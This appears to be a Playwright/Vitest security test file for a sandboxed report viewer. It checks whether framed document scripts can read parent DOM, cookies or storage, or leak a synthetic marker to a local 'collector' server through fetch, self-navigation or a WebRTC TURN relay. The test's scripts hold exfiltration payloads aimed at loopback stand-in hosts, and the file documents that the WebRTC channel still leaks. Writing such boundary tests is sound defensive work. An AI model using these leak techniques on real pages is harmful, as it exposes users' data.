import type { Server } from 'node:http'
import type { Browser } from 'playwright'
import { createSocket } from 'node:dgram'
import { mkdirSync, writeFileSync } from 'node:fs'
import { createServer } from 'node:http'
import { resolve } from 'node:path'
import process from 'node:process'
import { chromium } from 'playwright'
import { afterAll, beforeAll, expect, it } from 'vitest'

// M1 decision probe: real browser requests, disposable loopback data only.
// This deliberately asserts the proposed boundary, not today's static renderer.
const artifacts = resolve('.artifacts/interactive-boundary')
const policy = [
  'default-src \'none\'', 'script-src \'unsafe-inline\'', 'style-src \'unsafe-inline\'',
  'img-src data:', 'font-src data:', 'connect-src \'none\'', 'frame-src \'none\'',
  'object-src \'none\'', 'base-uri \'none\'', 'form-action \'none\'', 'sandbox allow-scripts',
].join('; ')
const marker = 'synthetic-report-data-1429'
const observations: Record<string, unknown> = {}
const received: string[] = []
const turnReceived: string[] = []
const turn = createSocket('udp4')
let turnPort: number
let content: Server
let collector: Server
let shell: Server
let browser: Browser
let contentOrigin: string
let shellOrigin: string
let collectorOrigin: string

async function listen(server: Server): Promise<string> {
  await new Promise<void>((resolveListening, reject) => {
    server.once('error', reject)
    server.listen(0, '127.0.0.1', resolveListening)
  })
  const address = server.address()
  if (!address || typeof address === 'string') throw new Error('Expected a TCP listener')
  return `http://127.0.0.1:${address.port}`
}

function documentHtml(mode: string) {
  return `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Reports rendering boundary probe</title>
  <style>body{font:20px system-ui;padding:32px;color:#143042;background:#f0f7f9}button{font:inherit;padding:12px}output{display:block;padding:16px;background:white}svg{width:180px;height:60px}</style></head>
  <body><h1>Interactive Reports prototype</h1><p>Only synthetic data. This is a boundary probe, not a deployed report.</p>
  <button id="calculate">Calculate embedded total</button><output id="result">Ready</output>
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 180 60"><rect width="120" height="40" fill="#107b7b"/></svg>
  <p id="boundary"></p><script>
  const results = {};
  document.querySelector('#calculate').onclick = () => document.querySelector('#result').textContent = String([12,18,30].reduce((a,b)=>a+b,0));
  for (const [name,read] of Object.entries({parent:()=>parent.document.body.innerHTML,cookie:()=>document.cookie,storage:()=>localStorage.length})) {
    try {read();results[name]='allowed'} catch(error) {results[name]=error.name}
  }
  window.results=results;
  document.querySelector('#boundary').textContent=JSON.stringify(results);
  if (${JSON.stringify(mode)} === 'fetch') {
    fetch(${JSON.stringify(`${collectorOrigin}/fetch?data=${marker}`)}).then(()=>results.fetch='allowed',()=>results.fetch='blocked');
  }
  if (${JSON.stringify(mode)} === 'navigate') {
    location.replace(${JSON.stringify(`${collectorOrigin}/navigation?data=${marker}`)});
  }
  if (${JSON.stringify(mode)} === 'webrtc') {
    const peer = new RTCPeerConnection({iceServers:[{urls:'turn:127.0.0.1:${turnPort}',username:${JSON.stringify(marker)},credential:'fixture-only'}],iceTransportPolicy:'relay'});
    peer.createDataChannel('fixture');
    peer.onicegatheringstatechange=()=>document.body.dataset.ice=peer.iceGatheringState;
    setTimeout(()=>document.body.dataset.probe='complete',2000);
    peer.createOffer().then(offer=>peer.setLocalDescription(offer));
    window.peer=peer;
  }
  </script></body></html>`
}

beforeAll(async () => {
  mkdirSync(artifacts, { recursive: true })
  await new Promise<void>(resolveListening => turn.bind(0, '127.0.0.1', resolveListening))
  turnPort = turn.address().port
  turn.on('message', (bytes, remote) => {
    turnReceived.push(bytes.toString('hex'))
    function attribute(type: number, value: Buffer) {
      const result = Buffer.alloc(4 + Math.ceil(value.length / 4) * 4)
      result.writeUInt16BE(type, 0); result.writeUInt16BE(value.length, 2); value.copy(result, 4)
      return result
    }
    const binding = bytes.readUInt16BE(0) === 1
    const mapped = Buffer.alloc(8)
    mapped[1] = 1
    mapped.writeUInt16BE(remote.port ^ 0x2112, 2)
    mapped.writeUInt32BE((0x7F000001 ^ 0x2112A442) >>> 0, 4)
    const body = binding ? attribute(0x0020, mapped) : Buffer.concat([attribute(9, Buffer.from([0, 0, 4, 1])), attribute(20, Buffer.from('fixture')), attribute(21, Buffer.from('fixture-nonce'))])
    const header = Buffer.from(bytes.subarray(0, 20))
    header.writeUInt16BE(binding ? 0x0101 : 0x0113, 0); header.writeUInt16BE(body.length, 2)
    turn.send(Buffer.concat([header, body]), remote.port, remote.address)
  })
  collector = createServer((request, response) => {
    received.push(request.url || '/')
    response.setHeader('content-type', 'text/html; charset=utf-8')
    response.end('<!doctype html><title>Collector reached</title><h1>Network boundary crossed</h1><p>The collector received synthetic document data.</p>')
  })
  collectorOrigin = await listen(collector)
  content = createServer((request, response) => {
    const url = new URL(request.url || '/', 'http://fixture')
    const mode = url.searchParams.get('mode') || 'interactive'
    if (url.searchParams.has('guard') && request.headers['sec-fetch-dest'] !== 'iframe') {
      response.writeHead(403, { 'content-type': 'text/plain', 'content-security-policy': 'default-src \'none\'' })
      response.end('Use the trusted Reports viewer.')
      return
    }
    response.setHeader('content-type', 'text/html; charset=utf-8')
    response.setHeader('content-security-policy', `${policy}; webrtc 'block'`)
    response.setHeader('referrer-policy', 'no-referrer')
    response.setHeader('x-content-type-options', 'nosniff')
    response.setHeader('cache-control', 'no-store')
    response.end(documentHtml(mode))
  })
  contentOrigin = await listen(content)
  shell = createServer((request, response) => {
    const mode = new URL(request.url || '/', 'http://fixture').searchParams.get('mode') || 'interactive'
    response.setHeader('content-type', 'text/html; charset=utf-8')
    response.setHeader('content-security-policy', `default-src 'none'; style-src 'unsafe-inline'; frame-src ${contentOrigin}`)
    response.end(`<!doctype html><title>Trusted prototype shell</title><style>body{font:18px system-ui}iframe{width:95vw;height:650px;border:2px solid #107b7b}</style><h1>Reports M1 — synthetic fixture</h1><iframe title="Document" sandbox="allow-scripts" referrerpolicy="no-referrer" src="${contentOrigin}/?mode=${mode}"></iframe>`)
  })
  shellOrigin = await listen(shell)
  browser = await chromium.launch({ executablePath: process.env.CHROME_PATH || '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', headless: true })
  observations.browser = browser.version()
  observations.policy = `${policy}; webrtc 'block'`
  observations.scope = 'Isolated browser policy prototype; not full Reports authorization or product acceptance'
})

afterAll(async () => {
  observations.received = received
  observations.turnReceived = turnReceived
  writeFileSync(resolve(artifacts, 'observations.json'), JSON.stringify(observations, null, 2))
  await browser?.close()
  turn.close()
  await Promise.all([content, collector, shell].filter(Boolean).map(server => new Promise<void>((resolveClosed, reject) => server.close(error => error ? reject(error) : resolveClosed()))))
})

it('executes embedded calculations while denying parent DOM, cookies and storage', async () => {
  const page = await browser.newPage({ viewport: { width: 1200, height: 900 } })
  try {
    await page.goto(shellOrigin)
    const frame = page.frameLocator('iframe')
    await frame.locator('#calculate').click()
    expect(await frame.locator('#result').textContent()).toBe('60')
    const result = JSON.parse(await frame.locator('#boundary').textContent() || '{}')
    expect(result).toEqual({ parent: 'SecurityError', cookie: 'SecurityError', storage: 'SecurityError' })
    observations.interaction = result
    await page.screenshot({ path: resolve(artifacts, 'interaction.png'), fullPage: true })
  }
  finally { await page.close() }
})

it('blocks fetch before a request reaches the collector', async () => {
  const page = await browser.newPage()
  try {
    await page.goto(`${shellOrigin}/?mode=fetch`)
    const frame = page.frames().find(item => item.url().startsWith(contentOrigin))
    if (!frame) throw new Error('Content frame missing')
    await frame.waitForFunction('window.results.fetch === "blocked"')
    expect(received.filter(url => url.startsWith('/fetch'))).toEqual([])
    observations.fetch = 'blocked'
  }
  finally { await page.close() }
})

it('prevents document data leaving through self-navigation in the framed viewer', async () => {
  const page = await browser.newPage()
  try {
    const before = received.length
    await page.goto(`${shellOrigin}/?mode=navigate`)
    await page.waitForLoadState('networkidle')
    observations.framedNavigation = received.slice(before)
    await page.screenshot({ path: resolve(artifacts, 'framed-navigation.png'), fullPage: true })
    expect(received.slice(before)).toEqual([])
  }
  finally { await page.close() }
})

it('records why unguarded direct HTML must never be served', async () => {
  const page = await browser.newPage()
  try {
    const before = received.length
    await page.goto(`${contentOrigin}/?mode=navigate`)
    await page.waitForLoadState('networkidle')
    observations.directNavigation = received.slice(before)
    await page.screenshot({ path: resolve(artifacts, 'direct-navigation.png'), fullPage: true })
    expect(received.slice(before)).toContain(`/navigation?data=${marker}`)
  }
  finally { await page.close() }
})

it('denies direct delivery before executing document scripts using Fetch Metadata', async () => {
  const page = await browser.newPage()
  try {
    const before = received.length
    const response = await page.goto(`${contentOrigin}/?mode=navigate&guard=1`)
    expect(response?.status()).toBe(403)
    expect(received.slice(before)).toEqual([])
    observations.directGuard = '403 before HTML delivery'
  }
  finally { await page.close() }
})

it('records the owner-accepted WebRTC egress capability of publisher-trusted scripts', async () => {
  const page = await browser.newPage()
  try {
    await page.goto(`${shellOrigin}/?mode=webrtc`)
    const frame = page.frames().find(item => item.url().startsWith(contentOrigin))
    if (!frame) throw new Error('Content frame missing')
    await expect.poll(() => frame.locator('body').getAttribute('data-probe'), { timeout: 10000 }).toBe('complete')
    observations.turnLeaksMarker = turnReceived.some(hex => Buffer.from(hex, 'hex').includes(marker))
    expect(observations.turnLeaksMarker).toBe(true)
  }
  finally { await page.close() }
})
